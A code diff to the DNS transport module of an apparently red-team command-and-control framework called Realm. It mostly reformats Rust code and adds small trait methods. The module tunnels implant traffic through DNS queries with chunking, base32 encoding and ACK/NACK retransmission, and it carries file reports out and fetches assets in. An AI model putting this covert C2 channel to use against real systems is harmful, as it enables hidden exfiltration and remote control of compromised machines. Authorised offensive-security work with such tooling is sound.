@@ -1,13 +1,13 @@
 // DNS transport implementation for Realm C2
 // This module provides DNS-based communication with stateless packet protocol
 
+use crate::Transport;
 use anyhow::Result;
 use pb::c2::*;
 use pb::dns::*;
 use prost::Message;
 use std::sync::mpsc::{Receiver, Sender};
 use tokio::net::UdpSocket;
-use crate::Transport;
 
 // Protocol limits
 const MAX_LABEL_LENGTH: usize = 63;
@@ -15,7 +15,7 @@ const MAX_DNS_NAME_LENGTH: usize = 253;
 const CONV_ID_LENGTH: usize = 8;
 
 // Async protocol configuration
-const SEND_WINDOW_SIZE: usize = 10;  // Packets in flight
+const SEND_WINDOW_SIZE: usize = 10; // Packets in flight
 const MAX_RETRIES_PER_CHUNK: u32 = 3; // Max retries for a chunk
 const MAX_DATA_SIZE: usize = 50 * 1024 * 1024; // 50MB max data size
 
@@ -204,7 +204,12 @@ impl DNS {
     }
 
     /// Try a single DNS query against a specific server
-    async fn try_dns_query(&self, server: &str, query: &[u8], expected_txid: u16) -> Result<Vec<u8>> {
+    async fn try_dns_query(
+        &self,
+        server: &str,
+        query: &[u8],
+        expected_txid: u16,
+    ) -> Result<Vec<u8>> {
         // Create UDP socket with timeout
         let socket = UdpSocket::bind("0.0.0.0:0").await?;
         socket.connect(server).await?;
@@ -282,7 +287,11 @@ impl DNS {
         // Validate transaction ID
         let response_txid = u16::from_be_bytes([response[0], response[1]]);
         if response_txid != expected_txid {
-            return Err(anyhow::anyhow!("DNS transaction ID mismatch: expected {}, got {}", expected_txid, response_txid));
+            return Err(anyhow::anyhow!(
+                "DNS transaction ID mismatch: expected {}, got {}",
+                expected_txid,
+                response_txid
+            ));
         }
 
         // Read answer count from header
@@ -350,8 +359,11 @@ impl DNS {
 
             let encoded_str = String::from_utf8(all_data)
                 .map_err(|e| anyhow::anyhow!("Invalid UTF-8 in A/AAAA response: {}", e))?;
-            all_data = base32::decode(base32::Alphabet::Rfc4648 { padding: false }, &encoded_str.to_uppercase())
-                .ok_or_else(|| anyhow::anyhow!("Failed to decode base32 from A/AAAA records"))?;
+            all_data = base32::decode(
+                base32::Alphabet::Rfc4648 { padding: false },
+                &encoded_str.to_uppercase(),
+            )
+            .ok_or_else(|| anyhow::anyhow!("Failed to decode base32 from A/AAAA records"))?;
         }
 
         Ok(all_data)
@@ -373,8 +385,12 @@ impl DNS {
 
     /// Send raw request bytes and receive raw response bytes using DNS protocol with async transmission
     /// Uses windowed transmission with ACK/NACK-based retransmission
-    async fn dns_exchange_raw(&mut self, request_data: Vec<u8>, method_code: &str) -> Result<Vec<u8>> {
-        use std::collections::{HashSet, HashMap};
+    async fn dns_exchange_raw(
+        &mut self,
+        request_data: Vec<u8>,
+        method_code: &str,
+    ) -> Result<Vec<u8>> {
+        use std::collections::{HashMap, HashSet};
 
         // Validate data size
         if request_data.len() > MAX_DATA_SIZE {
@@ -391,11 +407,7 @@ impl DNS {
         let (chunk_size, total_chunks) = if request_data.is_empty() {
             (self.calculate_max_chunk_size(1), 1)
         } else {
-            let varint_ranges = [
-                (1u32, 127u32),
-                (128u32, 16383u32),
-                (16384u32, 2097151u32),
-            ];
+            let varint_ranges = [(1u32, 127u32), (128u32, 16383u32), (16384u32, 2097151u32)];
 
             let mut result = None;
             for (min_chunks, max_chunks) in varint_ranges.iter() {
@@ -421,8 +433,13 @@ impl DNS {
 
         let data_crc = Self::calculate_crc32(&request_data);
 
-        log::debug!("DNS: Request size={} bytes, chunks={}, chunk_size={} bytes, crc32={:#x}",
-            request_data.len(), total_chunks, chunk_size, data_crc);
+        log::debug!(
+            "DNS: Request size={} bytes, chunks={}, chunk_size={} bytes, crc32={:#x}",
+            request_data.len(),
+            total_chunks,
+            chunk_size,
+            data_crc
+        );
 
         // Generate conversation ID
         let conv_id = Self::generate_conv_id();
@@ -456,7 +473,10 @@ impl DNS {
                 log::debug!("DNS: INIT sent for conv_id={}", conv_id);
             }
             Err(e) => {
-                return Err(anyhow::anyhow!("Failed to send INIT packet to DNS server: {}.", e));
+                return Err(anyhow::anyhow!(
+                    "Failed to send INIT packet to DNS server: {}.",
+                    e
+                ));
             }
         }
 
@@ -525,7 +545,10 @@ impl DNS {
                         acknowledged.insert(seq_u32);
                     } else {
                         // Unknown response format - assume need to retry this chunk
-                        log::debug!("DNS: Unknown response format ({} bytes), retrying chunk", response_data.len());
+                        log::debug!(
+                            "DNS: Unknown response format ({} bytes), retrying chunk",
+                            response_data.len()
+                        );
                         nack_set.insert(seq_u32);
                     }
                 }
@@ -544,7 +567,10 @@ impl DNS {
                     }
 
                     // Check for connection/network errors
-                    if err_msg.contains("timeout") || err_msg.contains("refused") || err_msg.contains("unreachable") {
+                    if err_msg.contains("timeout")
+                        || err_msg.contains("refused")
+                        || err_msg.contains("unreachable")
+                    {
                         eprintln!("DNS ERROR: Connection to DNS server failed.");
                     }
 
@@ -601,7 +627,10 @@ impl DNS {
 
                                     // Process NACKs
                                     for &new_nack in &status_packet.nacks {
-                                        if new_nack >= 1 && new_nack <= total_chunks as u32 && !acknowledged.contains(&new_nack) {
+                                        if new_nack >= 1
+                                            && new_nack <= total_chunks as u32
+                                            && !acknowledged.contains(&new_nack)
+                                        {
                                             nack_set.insert(new_nack);
                                         }
                                     }
@@ -623,11 +652,16 @@ impl DNS {
                 "Not all chunks acknowledged after max retries: {}/{} chunks. Missing: {:?}",
                 acknowledged.len(),
                 total_chunks,
-                (1..=total_chunks as u32).filter(|seq| !acknowledged.contains(seq)).collect::<Vec<_>>()
+                (1..=total_chunks as u32)
+                    .filter(|seq| !acknowledged.contains(seq))
+                    .collect::<Vec<_>>()
             ));
         }
 
-        log::debug!("DNS: All {} chunks acknowledged, sending FETCH", total_chunks);
+        log::debug!(
+            "DNS: All {} chunks acknowledged, sending FETCH",
+            total_chunks
+        );
 
         // All data sent and acknowledged
         // Now request the response via FETCH (or END for backward compatibility)
@@ -658,9 +692,7 @@ impl DNS {
 
         // Validate response is not empty
         if end_response.is_empty() {
-            return Err(anyhow::anyhow!(
-                "Server returned empty response."
-            ));
+            return Err(anyhow::anyhow!("Server returned empty response."));
         }
 
         // Check if response contains ResponseMetadata (chunked response indicator)
@@ -806,10 +838,12 @@ impl Transport for DNS {
         sender: Sender<FetchAssetResponse>,
     ) -> Result<()> {
         // Send fetch request and get raw response bytes
-        let response_bytes = self.dns_exchange_raw(
-            Self::marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request)?,
-            "/c2.C2/FetchAsset"
-        ).await?;
+        let response_bytes = self
+            .dns_exchange_raw(
+                Self::marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request)?,
+                "/c2.C2/FetchAsset",
+            )
+            .await?;
 
         // Parse length-prefixed encrypted chunks and send each one
         let mut offset = 0;
@@ -840,7 +874,9 @@ impl Transport for DNS {
 
             // Extract and decrypt chunk
             let encrypted_chunk = &response_bytes[offset..offset + chunk_len];
-            let chunk_response = Self::unmarshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(encrypted_chunk)?;
+            let chunk_response = Self::unmarshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(
+                encrypted_chunk,
+            )?;
 
             // Send chunk through channel
             if sender.send(chunk_response).is_err() {
@@ -872,7 +908,8 @@ impl Transport for DNS {
             // Iterate over the sync channel receiver in a spawned task to avoid blocking
             for chunk in request {
                 // Encrypt each chunk individually (like old implementation)
-                let chunk_bytes = Self::marshal_with_codec::<ReportFileRequest, ReportFileResponse>(chunk)?;
+                let chunk_bytes =
+                    Self::marshal_with_codec::<ReportFileRequest, ReportFileResponse>(chunk)?;
                 // Prefix each chunk with its length (4 bytes, big-endian)
                 all_chunks.extend_from_slice(&(chunk_bytes.len() as u32).to_be_bytes());
                 all_chunks.extend_from_slice(&chunk_bytes);
@@ -882,7 +919,8 @@ impl Transport for DNS {
         });
 
         // Wait for the spawned task to complete
-        let all_chunks = handle.await
+        let all_chunks = handle
+            .await
             .map_err(|e| anyhow::anyhow!("Failed to join chunk collection task: {}", e))??;
 
         if all_chunks.is_empty() {
@@ -892,7 +930,9 @@ impl Transport for DNS {
         // Send all chunks as a single DNS exchange (chunks are already individually encrypted)
         // This is RAW data - multiple length-prefixed encrypted messages concatenated
         // Do NOT encrypt again - pass directly to server
-        let response_bytes = self.dns_exchange_raw(all_chunks, "/c2.C2/ReportFile").await?;
+        let response_bytes = self
+            .dns_exchange_raw(all_chunks, "/c2.C2/ReportFile")
+            .await?;
 
         // Unmarshal response
         Self::unmarshal_with_codec::<ReportFileRequest, ReportFileResponse>(&response_bytes)
@@ -917,6 +957,24 @@ impl Transport for DNS {
         _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
         _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
     ) -> Result<()> {
-        Err(anyhow::anyhow!("reverse_shell not supported over DNS transport"))
+        Err(anyhow::anyhow!(
+            "reverse_shell not supported over DNS transport"
+        ))
+    }
+
+    fn get_type(&mut self) -> beacon::Transport {
+        beacon::Transport::Dns
+    }
+
+    fn is_active(&self) -> bool {
+        !self.base_domain.is_empty() && !self.dns_servers.is_empty()
+    }
+
+    fn name(&self) -> &'static str {
+        "dns"
+    }
+
+    fn list_available(&self) -> Vec<String> {
+        vec!["dns".to_string()]
     }
 }
